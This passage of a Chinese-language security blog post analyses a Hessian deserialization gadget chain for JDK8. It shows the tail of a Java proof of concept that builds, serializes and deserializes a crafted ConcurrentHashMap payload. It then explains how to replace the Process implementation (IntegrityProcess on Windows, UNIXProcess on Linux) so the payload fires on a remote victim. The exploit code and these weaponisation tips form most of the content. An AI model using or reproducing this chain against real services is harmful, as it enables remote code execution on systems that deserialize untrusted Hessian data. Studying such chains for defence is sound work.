+</span></span><span style="display:flex;"><span>        Object conEntry1 <span style="color:#f92672">=</span> newInstanceWithoutConstructor(Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.concurrent.ConcurrentHashMap$MapEntry&#34;</span>));
+</span></span><span style="display:flex;"><span>        Object conEntry2 <span style="color:#f92672">=</span> newInstanceWithoutConstructor(Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.concurrent.ConcurrentHashMap$MapEntry&#34;</span>));
+</span></span><span style="display:flex;"><span>        setFieldValue(conEntry1, <span style="color:#e6db74">&#34;key&#34;</span>, v1);
+</span></span><span style="display:flex;"><span>        setFieldValue(conEntry1, <span style="color:#e6db74">&#34;val&#34;</span>, v2);
+</span></span><span style="display:flex;"><span>        setFieldValue(conEntry2, <span style="color:#e6db74">&#34;key&#34;</span>, v2);
+</span></span><span style="display:flex;"><span>        setFieldValue(conEntry2, <span style="color:#e6db74">&#34;val&#34;</span>, v1);
+</span></span><span style="display:flex;"><span>        ConcurrentHashMap s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ConcurrentHashMap();
+</span></span><span style="display:flex;"><span>        setFieldValue(s, <span style="color:#e6db74">&#34;sizeCtl&#34;</span>, 2);
+</span></span><span style="display:flex;"><span>        Class nodeC;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            nodeC <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.concurrent.ConcurrentHashMap$Node&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> ( ClassNotFoundException e ) {
+</span></span><span style="display:flex;"><span>            nodeC <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.concurrent.ConcurrentHashMap$Entry&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        Constructor nodeCons <span style="color:#f92672">=</span> nodeC.<span style="color:#a6e22e">getDeclaredConstructor</span>(<span style="color:#66d9ef">int</span>.<span style="color:#a6e22e">class</span>, Object.<span style="color:#a6e22e">class</span>, Object.<span style="color:#a6e22e">class</span>, nodeC);
+</span></span><span style="display:flex;"><span>        nodeCons.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        Object tbl <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">newInstance</span>(nodeC, 2);
+</span></span><span style="display:flex;"><span>        Array.<span style="color:#a6e22e">set</span>(tbl, 0, nodeCons.<span style="color:#a6e22e">newInstance</span>(0, conEntry1, conEntry1, <span style="color:#66d9ef">null</span>));
+</span></span><span style="display:flex;"><span>        Array.<span style="color:#a6e22e">set</span>(tbl, 1, nodeCons.<span style="color:#a6e22e">newInstance</span>(0, conEntry2, conEntry2, <span style="color:#66d9ef">null</span>));
+</span></span><span style="display:flex;"><span>        setFieldValue(s, <span style="color:#e6db74">&#34;table&#34;</span>, tbl);
+</span></span><span style="display:flex;"><span>        Field table <span style="color:#f92672">=</span> ConcurrentHashMap.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;table&#34;</span>);
+</span></span><span style="display:flex;"><span>        table.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        table.<span style="color:#a6e22e">set</span>(s, tbl);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">ser</span>(Object o) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bao <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        HessianOutput output <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HessianOutput(bao);
+</span></span><span style="display:flex;"><span>        output.<span style="color:#a6e22e">getSerializerFactory</span>().<span style="color:#a6e22e">setAllowNonSerializable</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        output.<span style="color:#a6e22e">writeObject</span>(o);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> bao.<span style="color:#a6e22e">toByteArray</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">unser</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> in) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bai <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(in);
+</span></span><span style="display:flex;"><span>        HessianInput input <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HessianInput(bai);
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> input.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> o;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>测试发现，反序列化过程中会报错。</p>
+<h1 id="坑点分析">坑点分析<a hidden class="anchor" aria-hidden="true" href="#坑点分析">#</a></h1>
+<p>上面的链子中使用了 <code>ProcessImpl</code> 作为 <code>Process</code> 实现类，并且是在 <code>Windows</code> 环境下。该类的 <code>exitValue</code> 方法代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">exitValue</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> exitCode <span style="color:#f92672">=</span> getExitCodeProcess(handle);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (exitCode <span style="color:#f92672">==</span> STILL_ACTIVE)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalThreadStateException(<span style="color:#e6db74">&#34;process has not exited&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> exitCode;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>其中 <code>getExitCodeProcess</code> 方法是 <code>native</code> 方法，在 <code>Windows</code> 下会根据 <code>handle</code> 判断对应的进程是否已经 <code>exited</code>。上面的 POC 中是在生成序列化 Payload 时调用了 <code>new ProcessBuilder().start()</code> 获得了一个 <code>ProcessImpl</code> 实例。所以在实战环境中，受害者服务器与攻击者的机器自然不可能是同一台机器，也更不可能在同一进程下。所以反序列化时无法通过 <code>handle</code> 定位到相应进程，所以爆出了句柄无效的错误：</p>
+<p><img alt="1" loading="lazy" src="/posts/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B0%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%9D%91%E7%82%B9/images/1.png"></p>
+<p>这种写法在本地复现时可能能触发成功，但实际上时不能用的。</p>
+<p>这是可以用 <code>Process</code> 的另一个实现类：<code>com.sun.deploy.nativesandbox.IntegrityProcess</code>，该类的 <code>exitValue</code> 方法代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">exitValue</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>直接返回 <code>0</code>，不会进行任何判断也不会报错。</p>
+<p>修改代码为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Class ProcessImplClass <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;com.sun.deploy.nativesandbox.IntegrityProcess&#34;</span>);
+</span></span><span style="display:flex;"><span>Process process <span style="color:#f92672">=</span> (Process) newInstanceWithoutConstructor(ProcessImplClass);
+</span></span></code></pre></div><p>这样生成的序列化 Payload 就可以在远程正常触发了。</p>
+<p>而对于 <code>Linux</code> 环境下直接使用 <code>UNIXProcess</code> 类作为 <code>Process</code> 实现类即可，该类的 <code>exitValue</code> 方法代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">exitValue</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hasExited) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalThreadStateException(<span style="color:#e6db74">&#34;process hasn&#39;t exited&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> exitcode;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>在生成序列化 Payload 时手动指定 <code>hasExited</code> 属性的值即可。</p>
+<p>这条链子只有在 JDK8 及以下使用，高版本 JDK 把 <code>ServerManagerImpl</code> 等类删除了。</p>
+<h1 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h1>
+<p><a href="https://www.n1ght.cn/2025/08/21/blackhat-JDD-hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jdk_fastjson%E9%93%BE/">https://www.n1ght.cn/2025/08/21/blackhat-JDD-hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jdk_fastjson%E9%93%BE/</a></p>
+<p><a href="https://xz.aliyun.com/news/18935">https://xz.aliyun.com/news/18935</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
